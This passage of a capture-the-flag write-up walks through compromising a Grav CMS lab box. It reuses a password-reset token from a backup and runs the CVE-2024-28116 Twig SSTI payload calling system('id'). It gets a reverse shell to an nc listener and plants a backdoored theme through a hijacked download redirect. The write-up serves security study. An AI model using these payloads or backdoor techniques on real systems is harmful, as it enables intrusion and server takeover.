+            <span class="p">[</span><span class="nv">$good_token</span><span class="p">,</span> <span class="nv">$expire</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'::'</span><span class="p">,</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'reset'</span><span class="p">));</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$good_token</span> <span class="o">===</span> <span class="nv">$token</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nv">$expire</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">setMessage</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">translate</span><span class="p">(</span><span class="s1">'PLUGIN_ADMIN.RESET_LINK_EXPIRED'</span><span class="p">),</span> <span class="s1">'error'</span><span class="p">);</span>
+
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">form</span><span class="o">-&gt;</span><span class="nb">reset</span><span class="p">();</span>
+
+                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">createRedirectResponse</span><span class="p">(</span><span class="s1">'/forgot'</span><span class="p">);</span>
+                <span class="p">}</span>
+
+                <span class="c1">// Set new password.</span>
+                <span class="nv">$login</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getLogin</span><span class="p">();</span>
+                <span class="k">try</span> <span class="p">{</span>
+                    <span class="nv">$login</span><span class="o">-&gt;</span><span class="nf">validateField</span><span class="p">(</span><span class="s1">'password1'</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">\RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">setMessage</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">translate</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">()),</span> <span class="s1">'error'</span><span class="p">);</span>
+
+                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">createRedirectResponse</span><span class="p">(</span><span class="s2">"/reset/u/</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="nv">$token</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
+                <span class="p">}</span>
+
+                <span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">undef</span><span class="p">(</span><span class="s1">'hashed_password'</span><span class="p">);</span>
+                <span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">undef</span><span class="p">(</span><span class="s1">'reset'</span><span class="p">);</span>
+                <span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">update</span><span class="p">([</span><span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="nv">$password</span><span class="p">]);</span>
+                <span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">();</span>
+
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">form</span><span class="o">-&gt;</span><span class="nb">reset</span><span class="p">();</span>
+
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">setMessage</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">translate</span><span class="p">(</span><span class="s1">'PLUGIN_ADMIN.RESET_PASSWORD_RESET'</span><span class="p">));</span>
+
+                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">createRedirectResponse</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="nc">Admin</span><span class="o">::</span><span class="no">DEBUG</span> <span class="o">&amp;&amp;</span> <span class="nc">Admin</span><span class="o">::</span><span class="nf">addDebugMessage</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">'Failed to reset password: Token %s is not good'</span><span class="p">,</span> <span class="nv">$token</span><span class="p">));</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nc">Admin</span><span class="o">::</span><span class="no">DEBUG</span> <span class="o">&amp;&amp;</span> <span class="nc">Admin</span><span class="o">::</span><span class="nf">addDebugMessage</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">'Failed to reset password: User %s does not exist or has not requested reset'</span><span class="p">,</span> <span class="nv">$username</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">setMessage</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">translate</span><span class="p">(</span><span class="s1">'PLUGIN_ADMIN.RESET_INVALID_LINK'</span><span class="p">),</span> <span class="s1">'error'</span><span class="p">);</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">form</span><span class="o">-&gt;</span><span class="nb">reset</span><span class="p">();</span>
+
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">createRedirectResponse</span><span class="p">(</span><span class="s1">'/forgot'</span><span class="p">);</span>
+    <span class="p">}</span>    
+</code></pre></div></div>
+<p>This code is handling the submission of the token. In the same file, I’ll find the <code class="language-plaintext highlighter-rouge">taskForgot</code> function, which handles sending the email with the token to the user:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cd">/**
+     * Handle the email password recovery procedure.
+     *
+     * Sends email to the user.
+     *
+     * @return ResponseInterface
+     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">taskForgot</span><span class="p">():</span> <span class="kt">ResponseInterface</span>
+    <span class="p">{</span>
+            <span class="cd">/**
+     * Handle the email password recovery procedure.
+     *
+     * Sends email to the user.
+     *
+     * @return ResponseInterface
+     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">taskForgot</span><span class="p">():</span> <span class="kt">ResponseInterface</span>
+    <span class="p">{</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+</code></pre></div></div>
+<p>The token is a random MD5, and the time is one hour from when it’s created:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nv">$token</span>  <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">uniqid</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">(),</span> <span class="kc">true</span><span class="p">));</span>
+        <span class="nv">$expire</span> <span class="o">=</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">;</span> <span class="c1">// 1 hour</span>
+</code></pre></div></div>
+<p>Later it creates the <code class="language-plaintext highlighter-rouge">$reset_link</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="c1">// Do not trust username from the request.</span>
+        <span class="nv">$fullname</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="n">fullname</span> <span class="o">?:</span> <span class="nv">$username</span><span class="p">;</span>
+        <span class="nv">$author</span> <span class="o">=</span> <span class="nv">$config</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'site.author.name'</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
+        <span class="nv">$sitename</span> <span class="o">=</span> <span class="nv">$config</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'site.title'</span><span class="p">,</span> <span class="s1">'Website'</span><span class="p">);</span>
+        <span class="nv">$reset_link</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getAbsoluteAdminUrl</span><span class="p">(</span><span class="s2">"/reset/u/</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="nv">$token</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
+</code></pre></div></div>
+<h4 id="reset-password">Reset Password</h4>
+<p>The timestamp in my backup is from 2023, which is clearly expired. I’ll request a reset as patrick using the site (it will say the email failed to send, but that’s fine), and then download another backup. I can extract just the <code class="language-plaintext highlighter-rouge">patrick.yaml</code> file, and the code is different from before:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>unzip default_site_backup--20250829115451.zip user/accounts/patrick.yaml
+<span class="go">Archive:  default_site_backup--20250829115451.zip
+  inflating: user/accounts/patrick.yaml  
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>user/accounts/patrick.yaml | <span class="nb">grep </span>reset
+<span class="go">reset: '99dbabf226ea708a92257e429fa9caa4::1756472069'
+</span></code></pre></div></div>
+<p>The URL from this should be <code class="language-plaintext highlighter-rouge">/racers/admin/reset/u/patrick/99dbabf226ea708a92257e429fa9caa4</code>:</p>
+<picture>
+<source srcset="/img/image-20250829072917741.webp" type="image/webp"/>
+<img alt="image-20250829072917741" class="include_image" loading="lazy" src="/img/image-20250829072917741.png"/>
+</picture>
+<p>Finding a valid password is a pain, so I’ll just use the same as backup, and it works:</p>
+<picture>
+<source srcset="/img/image-20250829073951800.webp" type="image/webp"/>
+<img alt="image-20250829073951800" class="include_image" loading="lazy" src="/img/image-20250829073951800.png"/>
+</picture>
+<p>I can log in as patrick and there’s a lot more options in the admin menubar:</p>
+<picture>
+<source srcset="/img/image-20250829074019764.webp" type="image/webp"/>
+<img alt="image-20250829074019764" class="include_image" loading="lazy" src="/img/image-20250829074019764.png"/>
+</picture>
+<h3 id="multiple-paths">Multiple Paths</h3>
+<p>On originally solving the box, I used CVE-2024-28116. Only after rooting did I learn that that CVE came out after the box was released on VulnLab. There’s another neat path involving themes and proxying.</p>
+<pre><code class="language-mermaid">flowchart TD;
+    subgraph identifier[" "]
+      direction LR
+      start1[ ] ---&gt;|intended| stop1[ ]
+      style start1 height:0px;
+      style stop1 height:0px;
+      start2[ ] ---&gt;|unintended| stop2[ ]
+      style start2 height:0px;
+      style stop2 height:0px;
+    end
+    A[Admin access\nas patrick]--&gt;B(&lt;a href='#cve-2024-28116'&gt;CVE-2024-28116&lt;/a&gt;);
+    B--&gt;C[Shell as www-data];
+    A--&gt;D(&lt;a href='#malicious-theme'&gt;Proxy + malicious\ntheme&lt;/a&gt;);
+    D--&gt;C;
+
+linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
+linkStyle 1,2,3 stroke-width:2px,stroke:#4B9CD3,fill:none;
+style identifier fill:#1d1d1d,color:#FFFFFFFF;
+</code></pre>
+<h3 id="cve-2024-28116">CVE-2024-28116</h3>
+<h4 id="identify">Identify</h4>
+<p>Searching for Grav CVEs I’ll find three main potential candidates:</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-29440">CVE-2021-29440</a> - SSTI - This is too old, and patched in 1.7.11,  well before 1.7.43.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28116">CVE-2024-28116</a> - SSTI leading to RCE in versions up to 1.7.45.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-50286">CVE-2025-50286</a> - This doesn’t have a version range, likely because it’s not a vulnerability, and shouldn’t be a CVE (IMHO). This has to do with the ability to upload a malicious plugin and get RCE. For Race, neither backup nor patrick have access to this.</li>
+</ul>
+<h4 id="background">Background</h4>
+<p>The <a href="https://twig.symfony.com/">Twig template engine</a> is a PHP engine for build HTML and other documents from PHP. By design, it has a sandbox to prevent things like code execution. The CVE description says:</p>
+<blockquote>
+<p>Grav is an open-source, flat-file content management system. Grav CMS prior to version 1.7.45 is vulnerable to a Server-Side Template Injection (SSTI), which allows any authenticated user (editor permissions are sufficient) to execute arbitrary code on the remote server bypassing the existing security sandbox. Version 1.7.45 contains a patch for this issue.</p>
+</blockquote>
+<p>The <a href="https://github.com/getgrav/grav/security/advisories/GHSA-c9gp-64c4-2rrh">security advisory</a> shows a POC:</p>
+<div class="language-twig highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">{%</span> <span class="k">set</span> <span class="nv">arr</span> <span class="o">=</span> <span class="err">{</span><span class="s1">'1'</span><span class="err">:</span><span class="s1">'system'</span><span class="p">,</span> <span class="s1">'2'</span><span class="err">:</span><span class="s1">'foo'</span><span class="err">}</span> <span class="cp">%}</span>
+<span class="cp">{{</span> <span class="nv">var_dump</span><span class="p">(</span><span class="nv">grav.twig.twig_vars</span><span class="p">[</span><span class="s1">'config'</span><span class="p">]</span><span class="err">.</span><span class="nv">set</span><span class="p">(</span><span class="s1">'system.twig.safe_functions'</span><span class="p">,</span> <span class="nv">arr</span><span class="p">))</span> <span class="cp">}}</span>
+<span class="cp">{{</span> <span class="nv">system</span><span class="p">(</span><span class="s1">'id'</span><span class="p">)</span> <span class="cp">}}</span>
+</code></pre></div></div>
+<p>It is overwriting the <code class="language-plaintext highlighter-rouge">twig.safe_function</code> array to include <code class="language-plaintext highlighter-rouge">system</code> and then running it.</p>
+<h4 id="shell">Shell</h4>
+<p>I’ll go to the Pages section and create a new page, setting the content to the POC:</p>
+<picture>
+<source srcset="/img/image-20250829153349677.webp" type="image/webp"/>
+<img alt="image-20250829153349677" class="include_image" loading="lazy" src="/img/image-20250829153349677.png"/>
+</picture>
+<p>On loading <code class="language-plaintext highlighter-rouge">/racers/0xdf</code>, there’s a bunch on the screen, but at the bottom is the output of <code class="language-plaintext highlighter-rouge">id</code>:</p>
+<picture>
+<source srcset="/img/image-20250829153502849.webp" type="image/webp"/>
+<img alt="image-20250829153502849" class="include_image" loading="lazy" src="/img/image-20250829153502849.png"/>
+</picture>
+<p>I’ll update the page to a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>:</p>
+<picture>
+<source srcset="/img/image-20250829153554515.webp" type="image/webp"/>
+<img alt="image-20250829153554515" class="include_image" loading="lazy" src="/img/image-20250829153554515.png"/>
+</picture>
+<p>On refreshing <code class="language-plaintext highlighter-rouge">/racers/0xdf</code>, there’s a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.211 40736
+bash: cannot set terminal process group (1139): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@race:/var/www/html/racers$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@race:/var/www/html/racers$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">www-data@race:/var/www/html/racers$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@race:/var/www/html/racers$</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="malicious-theme">Malicious Theme</h3>
+<h4 id="theme-connectivity">Theme Connectivity</h4>
+<p>If I go to the Themes item in the menu bar, it shows the theme, and there’s an “+ Add” button at the top right:</p>
+<picture>
+<source srcset="/img/image-20250829180129226.webp" type="image/webp"/>
+<img alt="image-20250829180129226" class="include_image" loading="lazy" src="/img/image-20250829180129226.png"/>
+</picture>
+<p>If I click on it, it fails to show any because there’s no outbound connectivity from the VM to the internet:</p>
+<picture>
+<source srcset="/img/image-20250829180329446.webp" type="image/webp"/>
+<img alt="image-20250829180329446" class="include_image" loading="lazy" src="/img/image-20250829180329446.png"/>
+</picture>
+<p>Under Configuration –&gt; Advanced, there’s the option to set a proxy. I’ll fill in my IP to point at my instance of Burp Proxy:</p>
+<picture>
+<source srcset="/img/image-20250829180540784.webp" type="image/webp"/>
+<img alt="image-20250829180540784" class="include_image" loading="lazy" src="/img/image-20250829180540784.png"/>
+</picture>
+<p>I’ve also turned off the verify options. Burp serves two purposes here. First, it will allow the site to make requests that can get out to the internet, as while the box can’t talk to the internet, my host can. Second, it will allow me to modify those requests, even if they are to HTTPS sites.</p>
+<p>I’ll make sure my Burp is set to listen on all interfaces (under Proxy –&gt; Proxy settings –&gt; Tools –&gt; Proxy –&gt; Proxy listeners), and then go back to add a them, and there are a bunch there:</p>
+<picture>
+<source srcset="/img/image-20250829180735129.webp" type="image/webp"/>
+<img alt="image-20250829180735129" class="include_image" loading="lazy" src="/img/image-20250829180735129.png"/>
+</picture>
+<h4 id="installation-flow">Installation Flow</h4>
+<p>I’ll turn on interception in Burp, and click “+ Install” on one of the themes. The page hangs:</p>
+<picture>
+<source srcset="/img/image-20250829180828950.webp" type="image/webp"/>
+<img alt="image-20250829180828950" class="include_image" loading="lazy" src="/img/image-20250829180828950.png"/>
+</picture>
+<p>The first request goes to the local site:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/racers/admin/themes.json/task:getPackagesDependencies</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.129.234.211</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.129.234.211/racers/admin/themes/install</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=----geckoformboundary8ad97f0c75c6d7528456f2976ec9b91</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">317</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.129.234.211</span>
+<span class="na">Sec-GPC</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">grav-site-09f1269=p61ccje8rr2tg6klq1ub8frmb6; grav-site-09f1269-admin=mt0tr2utlbu65k0denlb5cf7kt; grav-tabs-state={%22tab--f0e041eed24f87f2b6b02fd6924d0a08%22:%22data.advanced%22}</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0</span>
+
+------geckoformboundary8ad97f0c75c6d7528456f2976ec9b91
+Content-Disposition: form-data; name="admin-nonce"
+
+733efa32bd79767a5b0669c3e874459f
+------geckoformboundary8ad97f0c75c6d7528456f2976ec9b91
+Content-Disposition: form-data; name="packages"
+
+aerial
+------geckoformboundary8ad97f0c75c6d7528456f2976ec9b91--
+</code></pre></div></div>
+<p>I’ll forward that, and it says it’s ready to install:</p>
+<picture>
+<source srcset="/img/image-20250829181002719.webp" type="image/webp"/>
+<img alt="image-20250829181002719" class="include_image" loading="lazy" src="/img/image-20250829181002719.png"/>
+</picture>
+<p>On clicking continue, two more local requests, before this one:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/download/themes/aerial/2.0.4</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">getgrav.org</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.129.234.211/racers</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Grav CMS</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+</code></pre></div></div>
+<p>I’ll tell Burp to intercept the response, and it is a 302 redirect to another page on GitHub:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">2</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 29 Aug 2025 22:11:23 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">https://github.com/Sommerregen/grav-theme-aerial/zipball/v2.0.4</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">cloudflare</span>
+<span class="na">Cf-Ray</span><span class="p">:</span> <span class="s">976f62457dc4c587-IAD</span>
+<span class="na">Cf-Cache-Status</span><span class="p">:</span> <span class="s">DYNAMIC</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">grav-site-e7f5c13=q6mjb0n8hptdbdcpib43a295f7; expires=Fri, 29-Aug-2025 22:41:23 GMT; Max-Age=1800; path=/; domain=getgrav.org; secure; HttpOnly; SameSite=Lax</span>
+<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=2592000</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Content-Security-Policy</span><span class="p">:</span> <span class="s">upgrade-insecure-requests</span>
+<span class="na">Permissions-Policy</span><span class="p">:</span> <span class="s">camera=(), geolocation=()</span>
+<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">strict-origin-when-cross-origin</span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">DENY</span>
+<span class="na">X-Xss-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
+<span class="na">Report-To</span><span class="p">:</span> <span class="s">{"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=KdHrB%2FaLSeRp1lCIIZI0P6xD9govMsi9bdKPXshVuFsHdXD8ghJ9B5lvbnF17kY4UiqaxBNl2mEcesb6MmQTMdsnGdhohCD8aGv5cd9RMJPXKF7Et21zdj1Wpy8m"}],"group":"cf-nel","max_age":604800}</span>
+<span class="na">Nel</span><span class="p">:</span> <span class="s">{"success_fraction":0,"report_to":"cf-nel","max_age":604800}</span>
+<span class="na">Server-Timing</span><span class="p">:</span> <span class="s">cfL4;desc="?proto=TCP&amp;rtt=8520&amp;min_rtt=8387&amp;rtt_var=2514&amp;sent=9&amp;recv=12&amp;lost=0&amp;retrans=0&amp;sent_bytes=3697&amp;recv_bytes=1241&amp;delivery_rate=517944&amp;cwnd=246&amp;unsent_bytes=0&amp;cid=28e1633b9c1d3af1&amp;ts=134&amp;x=0"</span>
+</code></pre></div></div>
+<p>This time I’ll just pass it through, and the website shows the details of the theme, and I’ll click “+ Install Theme”:</p>
+<picture>
+<source srcset="/img/image-20250829181911819.webp" type="image/webp"/>
+<img alt="image-20250829181911819" class="include_image" loading="lazy" src="/img/image-20250829181911819.png"/>
+</picture>
+<p>I’ll click “+ Install Theme” and let a bunch more local request through again until it makes the same GET request to <code class="language-plaintext highlighter-rouge">https://getgrav.org/download/themes/aerial/2.0.4</code>. This time in the response I’ll update the <code class="language-plaintext highlighter-rouge">Location</code> header to my host:</p>
+<picture>
+<source srcset="/img/image-20250829181812018.webp" type="image/webp"/>
+<img alt="image-20250829181812018" class="include_image" loading="lazy" src="/img/image-20250829181812018.png"/>
+</picture>
+<p>On letting that through, there’s a request to my server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.129.234.211 - - [29/Aug/2025 22:33:23] code 404, message File not found
+10.129.234.211 - - [29/Aug/2025 22:33:23] "GET /Sommerregen/grav-theme-aerial/zipball/v2.0.4 HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>I’ve effectively captured the install location.</p>
+<h4 id="malicious-plugin">Malicious Plugin</h4>
+<p>I’ll grab a copy of a real theme to my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git clone https://github.com/Sommerregen/grav-theme-aerial.git                           
+<span class="go">Cloning into 'grav-theme-aerial'...
+remote: Enumerating objects: 75, done.
+remote: Total 75 (delta 0), reused 0 (delta 0), pack-reused 75 (from 1)
+Receiving objects: 100% (75/75), 872.40 KiB | 6.66 MiB/s, done.    
+Resolving deltas: 100% (19/19), done.       
+</span></code></pre></div></div>
+<p>I’ll open and add a simple backdoor to the top:</p>
+<picture>
+<source srcset="/img/image-20250829183427309.webp" type="image/webp"/>
+<img alt="image-20250829183427309" class="include_image" loading="lazy" src="/img/image-20250829183427309.png"/>
+</picture>
+<p>Now I’ll zip it up:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zip <span class="nt">-r</span> badaerial.zip grav-theme-aerial/
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<h4 id="rce">RCE</h4>
+<p>I’ll repeat the installation steps, this time where it actually gets the zip. The resulting page is:</p>
+<picture>
+<source srcset="/img/image-20250829184045481.webp" type="image/webp"/>
+<img alt="image-20250829184045481" class="include_image" loading="lazy" src="/img/image-20250829184045481.png"/>
+</picture>
+<p>I’ll click “Active Aerial”, and it loads:</p>
+<picture>
+<source srcset="/img/image-20250829184132989.webp" type="image/webp"/>
+<img alt="image-20250829184132989" class="include_image" loading="lazy" src="/img/image-20250829184132989.png"/>
+</picture>
+<p>If I add <code class="language-plaintext highlighter-rouge">?cmd=id</code> to the URL, the output is there:</p>
+<picture>
+<source srcset="/img/image-20250829184211250.webp" type="image/webp"/>
+<img alt="image-20250829184211250" class="include_image" loading="lazy" src="/img/image-20250829184211250.png"/>
+</picture>
+<p>It’s right at the top of the source:</p>
+<picture>
+<source srcset="/img/image-20250829184232394.webp" type="image/webp"/>
+<img alt="image-20250829184232394" class="include_image" loading="lazy" src="/img/image-20250829184232394.png"/>
+</picture>
+<p>I can add a reverse shell there and get a shell as www-data.</p>
+<h2 id="shell-as-max">Shell as max</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>There are two user account with home directories in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@race:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">max  patrick
+</span></code></pre></div></div>
+<p>This matches the users with shells configured:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@race:/$</span><span class="w"> </span><span class="nb">cat </span>etc/passwd | <span class="nb">grep</span> <span class="s2">"sh$"</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+patrick:x:1000:1000:Patrick:/home/patrick:/bin/bash
+max:x:1001:1001::/home/max:/bin/bash
+</span></code></pre></div></div>
+<p>Both home directories are world readable. <code class="language-plaintext highlighter-rouge">patrick</code> is basically empty. <code class="language-plaintext highlighter-rouge">max</code> has <code class="language-plaintext highlighter-rouge">user.txt</code> as well as a link to <code class="language-plaintext highlighter-rouge">race-scripts</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@race:/home/max$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 36
+drwxr-xr-x 5 max  max  4096 Dec  9  2023 .
+drwxr-xr-x 4 root root 4096 Dec  3  2023 ..
+lrwxrwxrwx 1 root root    9 Dec  3  2023 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 max  max   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 max  max  3771 Jan  6  2022 .bashrc
+drwx------ 2 max  max  4096 Dec  3  2023 .cache
+drwxrwxr-x 3 max  max  4096 Dec  9  2023 .local
+-rw-r--r-- 1 max  max   807 Jan  6  2022 .profile
+drwxrwxr-x 2 max  max  4096 Dec  4  2023 bin
+lrwxrwxrwx 1 max  max    29 Dec  9  2023 race-scripts -&gt; /usr/local/share/race-scripts
+-rw-r----- 1 root max    33 Apr 16 04:17 user.txt
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">race-scripts</code> directory has another backup plan:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">backup  offsite-backup.sh
+</span></code></pre></div></div>
+<p>There are two scripts, but both are the exact same, other than owner:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@race:/usr/local/share/race-scripts$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-ls</span>
+<span class="go">   269766      4 -rwxr-xr-x   1 root     racers        361 Dec  9  2023 ./backup/offsite-backup.sh
+   272728      4 -rwxr-xr-x   1 root     root          361 Dec  5  2023 ./offsite-backup.sh
+</span><span class="gp">www-data@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">md5sum </span>offsite-backup.sh backup/offsite-backup.sh 
